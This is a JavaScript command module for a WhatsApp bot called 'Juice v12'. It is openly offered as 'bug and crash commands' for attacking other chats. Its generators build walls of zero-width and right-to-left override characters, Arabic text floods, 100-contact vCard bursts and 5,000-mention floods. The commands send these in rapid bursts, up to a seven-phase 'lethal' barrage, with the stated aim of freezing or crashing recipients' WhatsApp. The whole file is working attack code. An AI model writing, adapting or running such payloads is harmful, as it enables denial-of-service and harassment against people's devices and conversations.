//═════════════════════════════════//
/*
🔗 Juice v12 Bot System
by Ariah • 2024 - 2026
Contact: wa.me/254753204154
💀 BUG & CRASH COMMANDS — FULL POWER
*/
//═════════════════════════════════//
require('../setting')

// ══════════════════════════════════════════════════════════════
// CRASH GENERATORS
// ══════════════════════════════════════════════════════════════

// Zero-width flood — invisible characters that overwhelm rendering
function zwFlood(n) {
    n = n || 8000
    const chars = [
        '\u200b','\u200c','\u200d','\u200e','\u200f',
        '\u202a','\u202b','\u202c','\u202d','\u202e',
        '\u2060','\u2061','\u2062','\u2063','\uFEFF',
        '\u00AD','\u034f','\u17b4','\u17b5'
    ]
    return Array.from({length: n}, () => chars[Math.floor(Math.random() * chars.length)]).join('')
}

// Arabic RTL collapse — mixes RTL override + Arabic to shatter layout
function arabicBug(repeat) {
    repeat = repeat || 60
    const rtl     = '\u202e'
    const ltr     = '\u202d'
    const base    = '\u0623\u0646\u062a \u062a\u0647\u0643\u0631 \u0648\u0627\u0636\u062d \u0647\u0647\u0647'
    const rtlMark = '\u200f'
    let s = ''
    for (let i = 0; i < repeat; i++) s += rtl + base + ltr + rtlMark + '\n'
    return s
}

// Hard crash — BOM + RTL override + invisible + arabic wall
function hardCrash(reps) {
    reps = reps || 5
    const bom  = '\uFEFF'
    const rtlO = '\u202e'
    const ltrO = '\u202d'
    let out = ''
    for (let i = 0; i < reps; i++) {
        out += bom + rtlO + zwFlood(1500) + arabicBug(8) + ltrO + zwFlood(1500) + '\n'
    }
    return out
}

// vCard crash — 100 contact cards in ONE message
// Forces WhatsApp to load 100 profile pictures simultaneously → freeze/crash
function buildVcards(count) {
    count = count || 100
    const contacts = []
    for (let i = 0; i < count; i++) {
        contacts.push({
            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:\uD83D\uDC80 Juice Bug ' + (i + 1) + '\nORG:Juice v12 Bug System;\nTEL;type=CELL;type=VOICE:+254' + String(700000000 + i) + '\nX-WA-BIZ-DESCRIPTION:Bug by Ariah\nEND:VCARD'
        })
    }
    return contacts
}

// Mention flood — fake JIDs WA render thread tries to resolve
function mentionFlood(count) {
    count = count || 5000
    const jids = []
    for (let i = 0; i < count; i++) {
        jids.push('254' + String(700000000 + i).padStart(9, '0') + '@s.whatsapp.net')
    }
    return jids
}

// Header banner
function HDR(title) {
    return '\u256c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256c\n' +
           '\u2551   \u26a1 *Juice v12 \u2014 Bug Mode*\n' +
           '\u2551   _Activated by Ariah_\n' +
           '\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563\n' +
           '\u2551 \ud83d\udd34 *' + title + '*\n' +
           '\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n' +
           '_\u26a1 Juice v12 \u2022 wa.me/254753204154_'
}

// Get target from mention or quoted
function getTarget(context) {
    const { m } = context
    if (m.mentionedJid && m.mentionedJid[0]) return m.mentionedJid[0]
    if (m.quoted && m.quoted.sender) return m.quoted.sender
    return null
}

const sleep = ms => new Promise(r => setTimeout(r, ms))

// ══════════════════════════════════════════════════════════════
// MODULE EXPORT
// ══════════════════════════════════════════════════════════════
module.exports = {
    type: 'bug',
    command: [
        'bug', 'bug1', 'bug2', 'bug3', 'bug4', 'bug5',
        'arabicbug', 'freezebug', 'zalgobug', 'invisiblebug',
        'crashbug', 'hardbug', 'mentionbug', 'spambug',
        'vcardbug', 'stickerbomb', 'maxcrash', 'reactionbug',
        'combobug', 'maxbug', 'lethal'
    ],
    operate: async (context) => {
        const { command, X, m, reply } = context
        const from = m.chat

        // ── .bug / .bug1 — Standard triple-wave crash ───────────────────────
        if (['bug', 'bug1'].includes(command)) {
            await reply(HDR('Standard Crash Bug Sent!'))
            await X.sendMessage(from, { text: zwFlood(6000) + arabicBug(40) + zwFlood(6000) })
            await sleep(300)
            await X.sendMessage(from, { text: arabicBug(60) + zwFlood(8000) + arabicBug(60) })
            await sleep(300)
            await X.sendMessage(from, { text: zwFlood(8000) + arabicBug(50) + zwFlood(4000) })
        }

        // ── .bug2 / .arabicbug — Arabic RTL renderer crash ─────────────────
        else if (['bug2', 'arabicbug'].includes(command)) {
            await reply(HDR('Arabic RTL Crash Bug!'))
            for (let i = 0; i < 6; i++) {
                await X.sendMessage(from, { text: arabicBug(80) + zwFlood(4000) })
                await sleep(250)
            }
        }

        // ── .bug3 / .invisiblebug — Invisible character tsunami ─────────────
        else if (['bug3', 'invisiblebug'].includes(command)) {
            await reply(HDR('Invisible Flood Bug!'))
            for (let i = 0; i < 10; i++) {
                await X.sendMessage(from, { text: zwFlood(10000) })
                await sleep(200)
            }
        }

        // ── .bug4 / .zalgobug — RTL+invisible combination ───────────────────
        else if (['bug4', 'zalgobug'].includes(command)) {
            await reply(HDR('RTL+Invisible Combo Bug!'))
            await X.sendMessage(from, { text: zwFlood(6000) + arabicBug(60) + zwFlood(6000) })
            await sleep(400)
            await X.sendMessage(from, { text: arabicBug(80) + zwFlood(10000) + arabicBug(80) })
        }

        // ── .bug5 / .freezebug — Freeze combo (6 rapid messages) ───────────
        else if (['bug5', 'freezebug'].includes(command)) {
            await reply(HDR('FREEZE BUG — Chat is freezing!'))
            const freeze = zwFlood(8000) + arabicBug(70) + zwFlood(8000)
            for (let i = 0; i < 8; i++) {
                await X.sendMessage(from, { text: freeze })
                await sleep(200)
            }
        }

        // ── .crashbug / .hardbug — BOM+RTL+invisible barrage ───────────────
        else if (['crashbug', 'hardbug'].includes(command)) {
            await reply(HDR('Hard Crash Bug! \uD83D\uDD25'))
            for (let i = 0; i < 6; i++) {
                await X.sendMessage(from, { text: hardCrash(6) })
                await sleep(300)
            }
        }

        // ── .mentionbug — 5000 fake JID mention flood ──────────────────────
        else if (command === 'mentionbug') {
            await reply(HDR('Mention Flood Bug! \uD83D\uDCDB'))
            const jids = mentionFlood(5000)
            await X.sendMessage(from, { text: arabicBug(50) + zwFlood(5000), mentions: jids })
            await sleep(400)
            await X.sendMessage(from, { text: zwFlood(8000) + arabicBug(50), mentions: jids })
        }

        // ── .spambug — 15 rapid escalating crash messages ──────────────────
        else if (command === 'spambug') {
            await reply(HDR('Spam Bug \u2014 15 crash messages incoming!'))
            for (let i = 1; i <= 15; i++) {
                const lvl =
                    i % 3 === 0 ? zwFlood(10000) + arabicBug(30) :
                    i % 3 === 1 ? arabicBug(60) + zwFlood(6000) :
                                  hardCrash(4)
                await X.sendMessage(from, { text: lvl })
                await sleep(250)
            }
        }

        // ── .vcardbug — 100 vCard contacts crash ───────────────────────────
        else if (command === 'vcardbug') {
            await reply(HDR('vCard Crash \u2014 Sending 100 contacts!\nWhatsApp loading 100 profile pics simultaneously...'))
            await X.sendMessage(from, {
                contacts: { displayName: '\uD83D\uDC80 100 Crash Contacts \u2014 Juice v12', contacts: buildVcards(100) }
            })
            await sleep(500)
            await X.sendMessage(from, {
                contacts: { displayName: '\uD83D\uDC80 Second Wave \u2014 Juice v12', contacts: buildVcards(100) }
            })
        }

        // ── .stickerbomb — 20 rapid-fire image messages ─────────────────────
        else if (command === 'stickerbomb') {
            await reply(HDR('Sticker Bomb \u2014 20 rapid messages!'))
            const urls = [
                'https://i.imgur.com/MBhpIDL.gif',
                'https://i.imgur.com/rFgk0vy.gif',
                'https://i.imgur.com/6vU4LhN.gif',
                'https://i.imgur.com/wXKeLy4.gif',
                'https://i.imgur.com/X4GK08G.gif',
            ]
            for (let i = 0; i < 20; i++) {
                try {
                    await X.sendMessage(from, {
                        image: { url: urls[i % urls.length] },
                        caption: '\uD83D\uDCA5 Bomb ' + (i + 1) + '/20 \u2014 Juice v12'
                    })
                } catch {}
                await sleep(200)
            }
        }

        // ── .maxcrash — ~55000 char RTL+invisible wall ──────────────────────
        else if (command === 'maxcrash') {
            await reply(HDR('MAX CRASH \u2014 55,000 char crash wall!'))
            let wall = ''
            for (let i = 0; i < 20; i++) wall += zwFlood(1500) + arabicBug(10)
            await X.sendMessage(from, { text: wall.slice(0, 55000) })
            await sleep(600)
            let wall2 = ''
            for (let i = 0; i < 20; i++) wall2 += arabicBug(12) + zwFlood(1200)
            await X.sendMessage(from, { text: wall2.slice(0, 55000) })
        }

        // ── .reactionbug — 30 rapid reactions ──────────────────────────────
        else if (command === 'reactionbug') {
            await reply(HDR('Reaction Bug \u2014 spamming 30 reactions!'))
            const emojis = ['\uD83D\uDC80','\uD83D\uDE31','\uD83D\uDD25','\u26A1','\uD83D\uDCA5',
                            '\u2620\uFE0F','\uD83E\uDD76','\uD83E\uDD2F','\uD83D\uDE08','\uD83D\uDC7B',
                            '\uD83D\uDE21','\uD83D\uDCA3','\uD83D\uDD2B','\u2694\uFE0F','\uD83D\uDDE1\uFE0F']
            for (let i = 0; i < 30; i++) {
                try {
                    await X.sendMessage(m.chat, { react: { text: emojis[i % emojis.length], key: m.key } })
                } catch {}
                await sleep(120)
            }
        }

        // ── .combobug — All techniques in sequence ──────────────────────────
        else if (command === 'combobug') {
            await reply(HDR('COMBO BUG \u2014 All vectors firing!'))
            for (let i = 0; i < 5; i++) { await X.sendMessage(from, { text: zwFlood(10000) }); await sleep(150) }
            for (let i = 0; i < 5; i++) { await X.sendMessage(from, { text: arabicBug(80) + zwFlood(4000) }); await sleep(150) }
            for (let i = 0; i < 4; i++) { await X.sendMessage(from, { text: hardCrash(6) }); await sleep(200) }
            await X.sendMessage(from, { contacts: { displayName: '\uD83D\uDC80 Bug Contacts', contacts: buildVcards(100) } })
            await sleep(400)
            let wall = ''; for (let i = 0; i < 15; i++) wall += zwFlood(2000) + arabicBug(12)
            await X.sendMessage(from, { text: wall.slice(0, 55000) })
            await sleep(300)
            await X.sendMessage(from, { text: arabicBug(60) + zwFlood(5000), mentions: mentionFlood(5000) })
        }

        // ── .maxbug / .lethal — MAXIMUM POWER 7-phase attack ───────────────
        else if (['maxbug', 'lethal'].includes(command)) {
            await reply(HDR('\u2620\uFE0F MAX BUG \u2014 MAXIMUM POWER!'))
            // Phase 1: Double vCard crash
            await X.sendMessage(from, { contacts: { displayName: '\uD83D\uDC80 Wave 1', contacts: buildVcards(100) } })
            await sleep(300)
            await X.sendMessage(from, { contacts: { displayName: '\uD83D\uDC80 Wave 2', contacts: buildVcards(100) } })
            await sleep(300)
            // Phase 2: Invisible tsunami (10 messages)
            for (let i = 0; i < 10; i++) { await X.sendMessage(from, { text: zwFlood(10000) }); await sleep(120) }
            // Phase 3: Arabic RTL storm (10 messages)
            for (let i = 0; i < 10; i++) { await X.sendMessage(from, { text: arabicBug(100) + zwFlood(5000) }); await sleep(120) }
            // Phase 4: Hard crash barrage (8 messages)
            for (let i = 0; i < 8; i++) { await X.sendMessage(from, { text: hardCrash(7) }); await sleep(150) }
            // Phase 5: 55k char wall (2 rounds)
            let wall1 = ''; for (let i = 0; i < 20; i++) wall1 += zwFlood(1500) + arabicBug(10)
            await X.sendMessage(from, { text: wall1.slice(0, 55000) }); await sleep(400)
            let wall2 = ''; for (let i = 0; i < 20; i++) wall2 += arabicBug(12) + zwFlood(1200)
            await X.sendMessage(from, { text: wall2.slice(0, 55000) }); await sleep(400)
            // Phase 6: 20 rapid spam
            for (let i = 0; i < 20; i++) {
                await X.sendMessage(from, { text: zwFlood(8000) + arabicBug(30) })
                await sleep(120)
            }
            // Phase 7: Double mention flood finale
            const jids = mentionFlood(5000)
            await X.sendMessage(from, { text: arabicBug(80) + zwFlood(8000), mentions: jids }); await sleep(250)
            await X.sendMessage(from, { text: zwFlood(8000) + arabicBug(80), mentions: jids })
        }
    }
}
